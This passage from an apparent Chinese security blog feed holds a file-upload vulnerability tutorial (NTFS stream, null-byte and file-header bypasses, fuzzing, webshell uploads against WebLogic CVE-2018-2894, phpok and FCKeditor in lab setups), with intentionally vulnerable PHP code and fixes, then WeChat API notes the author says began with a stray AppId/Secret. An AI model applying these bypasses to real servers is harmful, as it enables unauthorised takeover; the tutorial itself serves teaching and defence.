streams，简称ADS），是NTFS磁盘格式的一个特性，在NTFS文件系统下，每个文件都可以存在多个数据流，就是说除了主文件流之外还可以有许多非主文件流寄宿在主文件流中，它使用资源派生来维持与文件相关的信息。创建一个数据交换流文件的方法很简单，命令为“宿主文件:准备与宿主文件关联的数据流文件”。</p><p>​        详细相关介绍和内容可以查看文章：<a href="https://www.freebuf.com/column/143101.html。此处不做深入解释。" target="_blank" rel="noopener">https://www.freebuf.com/column/143101.html。此处不做深入解释。</a></p><p>上传文件为xxx.php::$DATA类型的文件。可以看到上传的文件为xxx.php::$data。</p><p><img src="\2019\05\文件上传漏洞\1559092873963.png" alt="1559092873963"></p><p>我们访问的时候就可以直接访问xxx.php文件。</p><p><img src="\2019\05\文件上传漏洞\1559093029478.png" alt="1559093029478"></p><h3 id="0x06-5、-00截断绕过"><a href="#0x06-5、-00截断绕过" class="headerlink" title="0x06-5、%00截断绕过"></a>0x06-5、%00截断绕过</h3><p>​        以上问题被绕过的根本原因是采用了一些有缺陷的黑名单限制，一般采用白名单的限制会减少相当多的绕过问题产生，但是并不意味着一定安全，在某些没有处理严格的程序上，仍然可以采用截断绕过的形式。</p><p>首先我们来看这段上传的代码：</p><pre><code>$is_upload = false;$msg = null;if(isset($_POST[&#39;submit&#39;])){    $ext_arr = array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;);    $file_ext = substr($_FILES[&#39;upload_file&#39;][&#39;name&#39;],strrpos($_FILES[&#39;upload_file&#39;][&#39;name&#39;],&quot;.&quot;)+1);    if(in_array($file_ext,$ext_arr)){        $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];        $img_path = $_POST[&#39;save_path&#39;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;        if(move_uploaded_file($temp_file,$img_path)){            $is_upload = true;        } else {            $msg = &quot;上传失败&quot;;        }    } else {        $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;    }}</code></pre><p>可以看出代码采用的白名单校验，只允许上传图片格式，理论上这个上传是不好绕过的。但是后面采用保存文件的时候，是路径拼接的形式，而路径又是从前端获取，所以我们可以采用在路径上截断。如下上传，显示文件路径中有个空格，这并不是真正意义上的空格，而是%00截断后显示成的空格。</p><p><img src="\2019\05\文件上传漏洞\1559095054720.png" alt="1559095054720"></p><p>访问上传地址路径：</p><p><img src="\2019\05\文件上传漏洞\1559095173000.png" alt="1559095173000"></p><h3 id="0x06-5、文件头检测绕过"><a href="#0x06-5、文件头检测绕过" class="headerlink" title="0x06-5、文件头检测绕过"></a>0x06-5、文件头检测绕过</h3><p>​        提到文件头检测，我们就先来认识一下常见文件的文件头格式。我们先打开一个正常的JPG图片格式文件，查看文件的文件头十六进制。采用010Editor。</p><p><img src="\2019\05\文件上传漏洞\1559096273090.png" alt="1559096273090"></p><p>​        右边栏中有明显的JFIF存储格式字样，文件头前十个字节为<code>FF D8 FF E0 00 10 4A 46 49 46</code>，其中开头标红的为标记码，FF D8代表SOI标记，意思是图像文件开始值。<code>4A 46 49 46</code>代表字符串JFIF标记。</p><p>关于JPEG文件格式介绍可以阅读：<a href="https://www.cnblogs.com/sddai/p/5666924.html" target="_blank" rel="noopener">https://www.cnblogs.com/sddai/p/5666924.html</a></p><p>​        然后我们再打开一份PNG文件格式的图片，同样采用010Editor来查看其十六进制。</p><p><img src="\2019\05\文件上传漏洞\1559097926431.png" alt="1559097926431"></p><p>​        对于的开头4字节为右栏中<code>‰PNG</code>字样，PNG的8字节文件署名域用来识别该文件是不是PNG文件。也就是<code>89 50 4E 47 0D 0A 1A 0A</code>。</p><p>关于PNG文件格式可以阅读：<a href="https://blog.csdn.net/qq_21950929/article/details/79198814" target="_blank" rel="noopener">https://blog.csdn.net/qq_21950929/article/details/79198814</a></p><p>​        同样打开一份GIF文件格式图片，用010Editor来打开查看文件。</p><p><img src="\2019\05\文件上传漏洞\1559098368605.png" alt="1559098368605"></p><p>​        文件十六进制中可以看到，其中<code>47 49 46 38 39 61</code>，代表了右栏中的GIF89a，这六个字节作为了GIF文件格式头的开头文件。而在其后的绕过中就采用了GIF89a这个字符串。</p><p>关于GIF文件格式可以阅读：<a href="https://www.jianshu.com/p/df52f1511cf8" target="_blank" rel="noopener">https://www.jianshu.com/p/df52f1511cf8</a></p><p>了解过文件格式后，我们来看这个文件格式检测绕过形式，首先查看代码，为了方便演示修改了源代码对文件格式的获取，此处只读取文件的前两个字节值：</p><pre><code>function getReailFileType($filename){    $file = fopen($filename, &quot;rb&quot;);    $bin = fread($file, 2); //只读2字节    fclose($file);    $strInfo = @unpack(&quot;C2chars&quot;, $bin);        $typeCode = intval($strInfo[&#39;chars1&#39;].$strInfo[&#39;chars2&#39;]);        $fileType = &#39;&#39;;        switch($typeCode){              case 255216:                        $fileType = &#39;jpg&#39;;            break;        case 13780:                        $fileType = &#39;png&#39;;            break;                case 7173:                        $fileType = &#39;gif&#39;;            break;        default:                        $fileType = &#39;unknown&#39;;        }            return $fileType;}$is_upload = false;$msg = null;if(isset($_POST[&#39;submit&#39;])){    $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];    $file_type = getReailFileType($temp_file);    if($file_type == &#39;unknown&#39;){        $msg = &quot;文件未知，上传失败！&quot;;    }else{        $file_ext = substr($_FILES[&#39;upload_file&#39;][&#39;name&#39;],strrpos($_FILES[&#39;upload_file&#39;][&#39;name&#39;],&quot;.&quot;)+1);  //此处为了方便演示添加了file_ext 变量        $img_path = UPLOAD_PATH.&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;        if(move_uploaded_file($temp_file,$img_path)){            $is_upload = true;        } else {            $msg = &quot;上传出错！&quot;;        }    }}</code></pre><p>然后上传php文件，修改文件内容，添加文件头GIF89a：</p><p><img src="\2019\05\文件上传漏洞\1559098775049.png" alt="1559098775049"></p><p>这种添加形式类似于在hex中修改添加：</p><p><img src="\2019\05\文件上传漏洞\1559098877198.png" alt="1559098877198"></p><p>然后在访问以上传的文件：</p><p><img src="\2019\05\文件上传漏洞\1559098969088.png" alt="1559098969088"></p><h2 id="0x07、利用工具进行FUZZ"><a href="#0x07、利用工具进行FUZZ" class="headerlink" title="0x07、利用工具进行FUZZ"></a>0x07、利用工具进行FUZZ</h2><p>​        很多网站对上传进行拦截的时候采取的是黑名单校验，当我们看到黑名单的时候就可以考虑采取修改后缀、截断等方式尝试绕过。</p><p>​        我们采用一个工具：<a href="https://github.com/c0ny1/upload-fuzz-dic-builder" target="_blank" rel="noopener">https://github.com/c0ny1/upload-fuzz-dic-builder</a> 来生成fuzz的字典。执行命令:</p><pre><code>python upload-fuzz-dic-builder.py -n test -a jpg -l php -m apache --os win -o upload_file.txt</code></pre><p>​        把生成的字典导入burp中，同时取消payload-encoding的选中状态。执行后可以看到有些php文件上传成功。然后访问其中上传成功的文件，查看是否执行。</p><p><img src="\2019\05\文件上传漏洞\1559100590314.png" alt="1559100590314"></p><p>访问如图中的地址文件，可以看到上传成功：</p><p><img src="\2019\05\文件上传漏洞\1559100614602.png" alt="1559100614602"></p><h2 id="0x08、实战演示"><a href="#0x08、实战演示" class="headerlink" title="0x08、实战演示"></a>0x08、实战演示</h2><p>演示漏洞为：CVE-2018-2894</p><p>漏洞环境：Linux  Weblogic 12.2</p><p>漏洞下载地址：<a href="https://github.com/vulhub/vulhub/tree/master/weblogic/CVE-2018-2894" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/weblogic/CVE-2018-2894</a></p><p>漏洞介绍：WebLogic管理端未授权的两个页面存在任意上传getshell漏洞，可直接获取权限。两个页面分别为/ws_utc/begin.do，/ws_utc/config.do。</p><p>影响范围为：Oracle WebLogic Server，版本10.3.6.0，12.1.3.0，12.2.1.2，12.2.1.3。</p><p>下载好vulhub后，进入相应的CVE目录，执行如下命令：</p><pre><code>docker-compose up -d</code></pre><p>等到docker构建结束，会在7001端口开放一个服务，如下所示：</p><p><img src="\2019\05\文件上传漏洞\1559179291741.png" alt="1559179291741"></p><p>此处需要登陆账号和密码，正常情况下是尝试弱口令进后台上传文件，此处方便演示，从构建日志中查看密码：</p><pre><code>docker-compose logs | grep password查看结果：weblogic_1  |       ----&gt; &#39;weblogic&#39; admin password: oZUcqr8jweblogic_1  | admin password  : [oZUcqr8j]weblogic_1  | *  password assigned to an admin-level user.  For *</code></pre><p>登陆后界面如下：</p><p><img src="\2019\05\文件上传漏洞\1559179424802.png" alt="1559179424802"></p><p>点击左侧中的base_domain选项，再点击下面的高级选项，从高级中启用web测试页，保存。</p><p><img src="\2019\05\文件上传漏洞\1559179572139.png" alt="1559179572139"></p><p>然后访问<a href="http://192.168.120.132:7001/ws_utc/config.do页面，设置Work" target="_blank" rel="noopener">http://192.168.120.132:7001/ws_utc/config.do页面，设置Work</a> Home Dir，可以看到其中已经填写一个目录，此目录访问需要登陆，修改为P牛的建议路径：</p><pre><code>/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css</code></pre><p>原路径为：</p><pre><code>/u01/oracle/user_projects/domains/base_domain/tmp/WSTestPageWorkDir</code></pre><p>在当前页面中选择安全-&gt;增加，上传webshell</p><p><img src="\2019\05\文件上传漏洞\1559180137203.png" alt="1559180137203"></p><p>然后从放回页面中查看id项时间戳，访问路径/ws_utc/css/config/keystore/时间戳_文件名</p><p><img src="\2019\05\文件上传漏洞\1559181960512.png" alt="1559181960512"></p><p>然后执行命令whoami:</p><p><img src="\2019\05\文件上传漏洞\1559182008589.png" alt="1559182008589"></p><h2 id="0x09、CMS实战演示"><a href="#0x09、CMS实战演示" class="headerlink" title="0x09、CMS实战演示"></a>0x09、CMS实战演示</h2><h3 id="0x09-1、PHPOK-任意文件上传"><a href="#0x09-1、PHPOK-任意文件上传" class="headerlink" title="0x09-1、PHPOK 任意文件上传"></a>0x09-1、PHPOK 任意文件上传</h3><p>演示漏洞为：phpok 任意文件上传</p><p>漏洞环境：Windows phpStudy</p><p>漏洞环境下载：<a href="https://download.phpok.com/4.8.338.zip" target="_blank" rel="noopener">https://download.phpok.com/4.8.338.zip</a></p><p>漏洞介绍：phpok 4.8.338版本管理后台存在任意文件上传漏洞，攻击者可利用漏洞上传任意文件，获取网站权限。</p><p>下载文件后，把解压的文件放入phpstudy中的www目录中，此处修改了版本号目录为phpok。然后访问本地地址：<a href="http://localhost/phpok，会自动进入安装页面，填写数据库密码，创建账号后自动进入安装页面，安装完成后显示如下：" target="_blank" rel="noopener">http://localhost/phpok，会自动进入安装页面，填写数据库密码，创建账号后自动进入安装页面，安装完成后显示如下：</a></p><p><img src="\2019\05\文件上传漏洞\1559121744850.png" alt="1559121744850"></p><p>使用一开始创建的账号密码登陆，登陆成功后在后侧的选择栏处选择工具-&gt;附件分类管理。</p><p><img src="\2019\05\文件上传漏洞\1559121904072.png" alt="1559121904072"></p><p>点击右侧上方的创建资源分类，然后在支持的附件类型中创建php文件类型。</p><p><img src="\2019\05\文件上传漏洞\1559122085369.png" alt="1559122085369"></p><p>选择左侧的内容管理-&gt;资讯中心-&gt;行业管理</p><p><img src="\2019\05\文件上传漏洞\1559122227998.png" alt="1559122227998"></p><p>点击页面中的选择图片-&gt;上传附近选择添加的附件类型-&gt;选择php文件上传，上传成功后点击上传的图片，选择预览就可以看到文件目录的地址</p><p><img src="\2019\05\文件上传漏洞\1559122408208.png" alt="1559122408208"></p><p>访问地址文件后门，可以看到执行代码成功</p><p><img src="\2019\05\文件上传漏洞\1559122505957.png" alt="1559122505957"></p><p>漏洞修复：此问题在高版本修复，及时升级到高版本处理，目前最新版本为5.2.116。</p><h3 id="0x09-2、FCKeditor-2-4-3-文件上传"><a href="#0x09-2、FCKeditor-2-4-3-文件上传" class="headerlink" title="0x09-2、FCKeditor 2.4.3 文件上传"></a>0x09-2、FCKeditor 2.4.3 文件上传</h3><p>演示漏洞为：FCKeditor 2.4.3 文件上传</p><p>漏洞环境：Windows phpStudy</p><p>漏洞环境下载：<a href="https://github.com/treadmillian/fckeditor.git" target="_blank" rel="noopener">https://github.com/treadmillian/fckeditor.git</a></p><p>漏洞介绍：FCKeditor  /fckeditor/editor/filemanager/upload/php/upload.php 文件上传漏洞。</p><p>首先从GitHub下载文件，放到phpStudy的www目录中，同时修改config.php文件，修改UserFilesPath参数为fck目录下的地址，修改如下：</p><pre><code>文件地址： \fckeditor\editor\filemanager\browser\default\connectors\php\config.php</code></pre><p><img src="\2019\05\文件上传漏洞\1559186974078.png" alt="1559186974078"></p><p>访问地址：<code>http://localhost/fckeditor/editor/filemanager/browser/default/connectors/test.html#</code></p><p><img src="\2019\05\文件上传漏洞\1559187113513.png" alt="1559187113513"></p><p>选择文件上传，由于2.4.3在文件配置已经进行了后缀的限制，默认限制为：</p><pre><code>array(&#39;html&#39;,&#39;htm&#39;,&#39;php&#39;,&#39;php2&#39;,&#39;php3&#39;,&#39;php4&#39;,&#39;php5&#39;,&#39;phtml&#39;,&#39;pwml&#39;,&#39;inc&#39;,&#39;asp&#39;,&#39;aspx&#39;,&#39;ascx&#39;,&#39;jsp&#39;,&#39;cfm&#39;,&#39;cfc&#39;,&#39;pl&#39;,&#39;bat&#39;,&#39;exe&#39;,&#39;com&#39;,&#39;dll&#39;,&#39;vbs&#39;,&#39;js&#39;,&#39;reg&#39;,&#39;cgi&#39;,&#39;htaccess&#39;,&#39;asis&#39;,&#39;sh&#39;,&#39;shtml&#39;,&#39;shtm&#39;,&#39;phtm&#39;) </code></pre><p>对于此处漏洞我们采用空格绕过，先上传一个JPG的图片，抓包修改后缀，添加空格如下：</p><p><img src="\2019\05\文件上传漏洞\1559195350373.png" alt="1559195350373"></p><p>访问上传产生的路径文件，路径会显示在页面中：</p><pre><code>http://localhost/fckeditor/editor/filemanager/browser/default/connectors/uploads/file/05091707156.php</code></pre><p><img src="\2019\05\文件上传漏洞\1559195487979.png" alt="1559195487979"></p><p>执行一句话木马文件：</p><p><img src="\2019\05\文件上传漏洞\1559195403133.png" alt="1559195403133"></p><p>漏洞修复：由于此处使用黑名单校验，可以根据需要的类型修改为白名单参数。</p><h2 id="0x10、漏洞修复"><a href="#0x10、漏洞修复" class="headerlink" title="0x10、漏洞修复"></a>0x10、漏洞修复</h2><p>关于文件上传漏洞的产生和修改此处讨论两种文件上传漏洞的情况和修复：</p><p>1、代码未判断文件类型或者文件类型限制不完全，一般这种是黑名单或者没有限制，建议添加白名单限制参数数组，固定为图片或文本格式文件。例如如下：</p><pre><code>if(isset($_POST[&#39;submit&#39;])){    $ext_arr = array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;);    $file_ext = substr($_FILES[&#39;upload_file&#39;][&#39;name&#39;],strrpos($_FILES[&#39;upload_file&#39;][&#39;name&#39;],&quot;.&quot;)+1);    if(in_array($file_ext,$ext_arr)){        $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];        $img_path = UPLOAD_PATH.&#39;/&#39;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;        if(move_uploaded_file($temp_file,$img_path)){            $is_upload = true;        } else {            $msg = &quot;上传失败&quot;;        }    } else {        $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;    }}</code></pre><p>2、如果是使用WEB中间件存在上传，或者是CMS存在文件上传漏洞，根据官方建议安装补丁升级版本，或者使用官方推荐的临时修改策略来限制问题的产生和利用。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x01、漏洞简介&quot;&gt;&lt;a href=&quot;#0x01、漏洞简介&quot; class=&quot;headerlink&quot; title=&quot;0x01、漏洞简介&quot;&gt;&lt;/a&gt;0x01、漏洞简介&lt;/h2&gt;&lt;p&gt;​       文件上传，顾名思义就是上传文件的功能行为，之所以会被发展为危害严重的
      
    
    </summary>
    
    
      <category term="web安全" scheme="/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>微信公众号接口</title>
    <link href="/2019/05/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7%E6%8E%A5%E5%8F%A3/"/>
    <id>/2019/05/微信公众号接口/</id>
    <published>2019-05-27T03:32:58.000Z</published>
    <updated>2019-05-27T03:33:38.075Z</updated>
    
    <content type="html"><![CDATA[<p>在一个偶然的机会获取到了一对微信AppId与Secret，于是整理了一下常用和有用的微信公众号信息获取的接口，以下是部分微信接口调用示例和说明。</p><h3 id="1、平台开发者获取access-token"><a href="#1、平台开发者获取access-token" class="headerlink" title="1、平台开发者获取access_token"></a>1、平台开发者获取access_token</h3><p>access_token是公众号的全局唯一接口调用凭据，公众号调用各接口时都需使用access_token。access_token的有效期目前为2个小时，需定时刷新，重复获取将导致上次获取的access_token失效。</p><h4 id="a、接口调用请求说明"><a href="#a、接口调用请求说明" class="headerlink" title="a、接口调用请求说明"></a>a、接口调用请求说明</h4><pre><code>http请求方式: GEThttps://api.weixin.qq.com/cgi-bin/token?grant_type=client_credential&amp;appid=APPID&amp;secret=APPSECRET</code></pre><h4 id="b、参数说明"><a href="#b、参数说明" class="headerlink" title="b、参数说明"></a>b、参数说明</h4><pre><code>参数               是否必须                说明grant_type           是        获取access_token填写client_credentialappid               是        第三方用户唯一凭证secret               是        第三方用户唯一凭证密钥，即appsecret</code></pre><h4 id="c、返回说明"><a href="#c、返回说明" class="headerlink" title="c、返回说明"></a>c、返回说明</h4><pre><code>微信会返回下述JSON数据包给公众号：{&quot;access_token&quot;:&quot;ACCESS_TOKEN&quot;,&quot;expires_in&quot;:7200}</code></pre><h3 id="2、获取微信服务器IP地址"><a href="#2、获取微信服务器IP地址" class="headerlink" title="2、获取微信服务器IP地址"></a>2、获取微信服务器IP地址</h3><p>如果公众号基于安全等考虑，需要获知微信服务器的IP地址列表，以便进行相关限制，可以通过该接口获得微信服务器IP地址列表或者IP网段信息。</p><h4 id="a、接口调用请求说明-1"><a href="#a、接口调用请求说明-1" class="headerlink" title="a、接口调用请求说明"></a>a、接口调用请求说明</h4><pre><code>http请求方式: GEThttps://api.weixin.qq.com/cgi-bin/getcallbackip?access_token=ACCESS_TOKEN</code></pre><h4 id="b、参数说明-1"><a href="#b、参数说明-1" class="headerlink" title="b、参数说明"></a>b、参数说明</h4><pre><code>参数                 是否必须            说明access_token          是            公众号的access_token</code></pre><h4 id="c、返回说明-1"><a href="#c、返回说明-1" class="headerlink" title="c、返回说明"></a>c、返回说明</h4><pre><code>正常情况下，微信会返回下述JSON数据包给公众号：{    &quot;ip_list&quot;: [        &quot;127.0.0.1&quot;,         &quot;127.0.0.2&quot;,         &quot;101.226.103.0/25&quot;    ]}</code></pre><h3 id="3、自定义菜单查询接口"><a href="#3、自定义菜单查询接口" class="headerlink" title="3、自定义菜单查询接口"></a>3、自定义菜单查询接口</h3><p>使用接口创建自定义菜单后，开发者还可使用接口查询自定义菜单的结构。另外请注意，在设置了个性化菜单后，使用本自定义菜单查询接口可以获取默认菜单和全部个性化菜单信息。</p><h4 id="a、请求说明"><a href="#a、请求说明" class="headerlink" title="a、请求说明"></a>a、请求说明</h4><pre><code>http请求方式：GEThttps://api.weixin.qq.com/cgi-bin/menu/get?access_token=ACCESS_TOKEN</code></pre><h4 id="b、参数说明-2"><a href="#b、参数说明-2" class="headerlink" title="b、参数说明"></a>b、参数说明</h4><pre><code>参数                 是否必须            说明access_token          是            公众号的access_token</code></pre><h4 id="c、返回说明-2"><a href="#c、返回说明-2" class="headerlink" title="c、返回说明"></a>c、返回说明</h4><pre><code>对应创建接口，正确的Json返回结果:{    &quot;menu&quot;: {        &quot;button&quot;: [            {                &quot;type&quot;: &quot;click&quot;,                 &quot;name&quot;: &quot;今日歌曲&quot;,                 &quot;key&quot;: &quot;V1001_TODAY_MUSIC&quot;,                 &quot;sub_button&quot;: [ ]            },             {                &quot;name&quot;: &quot;菜单&quot;,                 &quot;sub_button&quot;: [                    {                        &quot;type&quot;: &quot;view&quot;,                         &quot;name&quot;: &quot;搜索&quot;,                         &quot;url&quot;: &quot;http://www.soso.com/&quot;,                         &quot;sub_button&quot;: [ ]                    }                ]            }        ]    }}</code></pre><h3 id="4、自定义菜单删除接口"><a href="#4、自定义菜单删除接口" class="headerlink" title="4、自定义菜单删除接口"></a>4、自定义菜单删除接口</h3><p>使用接口创建自定义菜单后，开发者还可使用接口删除当前使用的自定义菜单。另请注意，在个性化菜单时，调用此接口会删除默认菜单及全部个性化菜单。</p><h4 id="a、请求说明-1"><a href="#a、请求说明-1" class="headerlink" title="a、请求说明"></a>a、请求说明</h4><pre><code>http请求方式：GEThttps://api.weixin.qq.com/cgi-bin/menu/delete?access_token=ACCESS_TOKEN</code></pre><h4 id="b、参数说明-3"><a href="#b、参数说明-3" class="headerlink" title="b、参数说明"></a>b、参数说明</h4><pre><code>参数                 是否必须            说明access_token          是            公众号的access_token</code></pre><h4 id="c、返回说明-3"><a href="#c、返回说明-3" class="headerlink" title="c、返回说明"></a>c、返回说明</h4><pre><code>对应创建接口，正确的Json返回结果:{&quot;errcode&quot;:0,&quot;errmsg&quot;:&quot;ok&quot;}</code></pre><h3 id="5、添加客服帐号"><a href="#5、添加客服帐号" class="headerlink" title="5、添加客服帐号"></a>5、<strong>添加客服帐号</strong></h3><p>开发者可以通过本接口为公众号添加客服账号，每个公众号最多添加10个客服账号。</p><h4 id="a、接口调用请求"><a href="#a、接口调用请求" class="headerlink" title="a、接口调用请求"></a>a、接口调用请求</h4><pre><code>http请求方式: POSThttps://api.weixin.qq.com/customservice/kfaccount/add?access_token=ACCESS_TOKEN</code></pre><h4 id="b、POST数据示例"><a href="#b、POST数据示例" class="headerlink" title="b、POST数据示例"></a>b、POST数据示例</h4><pre><code>{     &quot;kf_account&quot; : &quot;test1@test&quot;,     &quot;nickname&quot; : &quot;客服1&quot;,     &quot;password&quot; : &quot;pswmd5&quot;,}</code></pre><h4 id="c、返回说明-4"><a href="#c、返回说明-4" class="headerlink" title="c、返回说明"></a>c、返回说明</h4><pre><code>正确时的JSON返回结果{     &quot;errcode&quot; : 0,     &quot;errmsg&quot; : &quot;ok&quot;,}</code></pre><h3 id="6、获取所有客服账号"><a href="#6、获取所有客服账号" class="headerlink" title="6、获取所有客服账号"></a>6、<strong>获取所有客服账号</strong></h3><p>开发者通过本接口，获取公众号中所设置的客服基本信息，包括客服工号、客服昵称、客服登录账号。</p><h4 id="a、接口调用请求-1"><a href="#a、接口调用请求-1" class="headerlink" title="a、接口调用请求"></a>a、接口调用请求</h4><pre><code>http请求方式: GEThttps://api.weixin.qq.com/cgi-bin/customservice/getkflist?access_token=ACCESS_TOKEN</code></pre><h4 id="b、返回说明"><a href="#b、返回说明" class="headerlink" title="b、返回说明"></a>b、返回说明</h4><pre><code>{    &quot;kf_list&quot;: [        {            &quot;kf_account&quot;: &quot;test1@test&quot;,             &quot;kf_nick&quot;: &quot;ntest1&quot;,             &quot;kf_id&quot;: &quot;1001&quot;            &quot;kf_headimgurl&quot;: &quot; http://mmbiz.qpic.cn/mmbiz/4whpV1VZl2iccsvYbHvnphkyGtnvjfUS8Ym0GSaLic0FD3vN0V8PILcibEGb2fPfEOmw/0&quot;        },         {            &quot;kf_account&quot;: &quot;test2@test&quot;,             &quot;kf_nick&quot;: &quot;ntest2&quot;,             &quot;kf_id&quot;: &quot;1002&quot;            &quot;kf_headimgurl&quot;: &quot; http://mmbiz.qpic.cn/mmbiz/4whpV1VZl2iccsvYbHvnphkyGtnvjfUS8Ym0GSaLic0FD3vN0V8PILcibEGb2fPfEOmw /0&quot;        }    ]}</code></pre><h3 id="7、修改客服帐号"><a href="#7、修改客服帐号" class="headerlink" title="7、修改客服帐号"></a>7、<strong>修改客服帐号</strong></h3><p>开发者可以通过本接口为公众号修改客服账号。</p><h4 id="a、接口调用请求-2"><a href="#a、接口调用请求-2" class="headerlink" title="a、接口调用请求"></a>a、接口调用请求</h4><pre><code>http请求方式: POSThttps://api.weixin.qq.com/customservice/kfaccount/update?access_token=ACCESS_TOKEN</code></pre><h4 id="b、POST数据示例-1"><a href="#b、POST数据示例-1" class="headerlink" title="b、POST数据示例"></a>b、POST数据示例</h4><pre><code>{     &quot;kf_account&quot; : &quot;test1@test&quot;,     &quot;nickname&quot; : &quot;客服1&quot;,     &quot;password&quot; : &quot;pswmd5&quot;,}</code></pre><h4 id="c、返回说明-5"><a href="#c、返回说明-5" class="headerlink" title="c、返回说明"></a>c、返回说明</h4><pre><code>正确时的JSON返回结果{     &quot;errcode&quot; : 0,     &quot;errmsg&quot; : &quot;ok&quot;,}</code></pre><h3 id="8、删除客服帐号"><a href="#8、删除客服帐号" class="headerlink" title="8、删除客服帐号"></a>8、<strong>删除客服帐号</strong></h3><p>开发者可以通过该接口为公众号删除客服帐号。</p><h5 id="a、接口调用请求-3"><a href="#a、接口调用请求-3" class="headerlink" title="a、接口调用请求"></a>a、接口调用请求</h5><pre><code>http请求方式: GEThttps://api.weixin.qq.com/customservice/kfaccount/del?access_token=ACCESS_TOKEN</code></pre><h4 id="b、POST数据示例-2"><a href="#b、POST数据示例-2" class="headerlink" title="b、POST数据示例"></a>b、POST数据示例</h4><pre><code>{     &quot;kf_account&quot; : &quot;test1@test&quot;,     &quot;nickname&quot; : &quot;客服1&quot;,     &quot;password&quot; : &quot;pswmd5&quot;,}</code></pre><h4 id="c、返回说明-6"><a href="#c、返回说明-6" class="headerlink" title="c、返回说明"></a>c、返回说明</h4><pre><code>正确时的JSON返回结果{     &quot;errcode&quot; : 0,     &quot;errmsg&quot; : &quot;ok&quot;,}</code></pre><h3 id="9、用户授权登陆第三方应用"><a href="#9、用户授权登陆第三方应用" class="headerlink" title="9、用户授权登陆第三方应用"></a>9、用户授权登陆第三方应用</h3><p>第三方使用网站应用授权登录前请注意已获取相应网页授权作用域（scope=snsapi_login）。</p><h4 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h4><pre><code>https://open.weixin.qq.com/connect/qrconnect?appid=APPID&amp;redirect_uri=REDIRECT_URI&amp;response_type=code&amp;scope=SCOPE&amp;state=STATE#wechat_redirect</code></pre><h5 id="参数说明"><a href="#参数说明" class="headerlink" title="参数说明"></a><strong>参数说明</strong></h5><pre><code>参数              是否必须                    说明appid              是                    应用唯一标识redirect_uri      是             请使用urlEncode对链接进行处理response_type      是                       填codescope              是           应用授权作用域，拥有多个作用域用逗号（,）分隔，网页应用目前仅填写snsapi_login即state              否           用于保持请求和回调的状态，授权请求后原样带回给第三方。该参数可用于防止csrf攻击（跨站请求伪造攻击），建议第三方带上该参数，可设置为简单的随机数加session进行校验</code></pre><h5 id="返回说明"><a href="#返回说明" class="headerlink" title="返回说明"></a><strong>返回说明</strong></h5><pre><code>用户允许授权后，将会重定向到redirect_uri的网址上，并且带上code和state参数redirect_uri?code=CODE&amp;state=STATE</code></pre><h4 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a><strong>第二步</strong></h4><pre><code>通过code获取access_tokenhttps://api.weixin.qq.com/sns/oauth2/access_token?appid=APPID&amp;secret=SECRET&amp;code=CODE&amp;grant_type=authorization_code</code></pre><h5 id="参数说明-1"><a href="#参数说明-1" class="headerlink" title="参数说明"></a><strong>参数说明</strong></h5><pre><code>参数                是否必须         说明appid               是      应用唯一标识，在微信开放平台提交应用审核通过后获得secret               是      应用密钥AppSecret，在微信开放平台提交应用审核通过后获得code               是      填写第一步获取的code参数grant_type           是      填authorization_code</code></pre><h5 id="返回说明-1"><a href="#返回说明-1" class="headerlink" title="返回说明"></a><strong>返回说明</strong></h5><pre><code>正确的返回：{ &quot;access_token&quot;:&quot;ACCESS_TOKEN&quot;, &quot;expires_in&quot;:7200, &quot;refresh_token&quot;:&quot;REFRESH_TOKEN&quot;,&quot;openid&quot;:&quot;OPENID&quot;, &quot;scope&quot;:&quot;SCOPE&quot;,&quot;unionid&quot;: &quot;o6_bmasdasdsad6_2sgVt7hMZOPfL&quot;}</code></pre><h4 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a><strong>第三步</strong></h4><pre><code>获取access_token后，进行接口调用，有以下前提：1. access_token有效且未超时；2. 微信用户已授权给第三方应用帐号相应接口作用域（scope）。</code></pre><h5 id="接口作用域（scope），能调用的接口有以下"><a href="#接口作用域（scope），能调用的接口有以下" class="headerlink" title="接口作用域（scope），能调用的接口有以下"></a>接口作用域（scope），能调用的接口有以下</h5><p>其中snsapi_base属于基础接口，若应用已拥有其它scope权限，则默认拥有snsapi_base的权限。</p><table><thead><tr><th style="text-align:left">授权作用域（scope）</th><th style="text-align:left">接口</th><th style="text-align:left">接口说明</th></tr></thead><tbody><tr><td style="text-align:left">snsapi_base</td><td style="text-align:left">/sns/oauth2/access_token</td><td style="text-align:left">通过code换取access_token、refresh_token和已授权scope</td></tr><tr><td style="text-align:left">snsapi_base</td><td style="text-align:left">/sns/oauth2/refresh_token</td><td style="text-align:left">刷新或续期access_token使用</td></tr><tr><td style="text-align:left">snsapi_base</td><td style="text-align:left">/sns/auth</td><td style="text-align:left">检查access_token有效性</td></tr><tr><td style="text-align:left">snsapi_userinfo</td><td style="text-align:left">/sns/userinfo</td><td style="text-align:left">获取用户个人信息</td></tr></tbody></table><h5 id="拉取用户信息-需scope为-snsapi-userinfo"><a href="#拉取用户信息-需scope为-snsapi-userinfo" class="headerlink" title="拉取用户信息(需scope为 snsapi_userinfo)"></a><strong>拉取用户信息(需scope为 snsapi_userinfo)</strong></h5><pre><code>http：GEThttps://api.weixin.qq.com/sns/userinfo?access_token=ACCESS_TOKEN&amp;openid=OPENID&amp;lang=zh_CN </code></pre><h5 id="参数说明-2"><a href="#参数说明-2" class="headerlink" 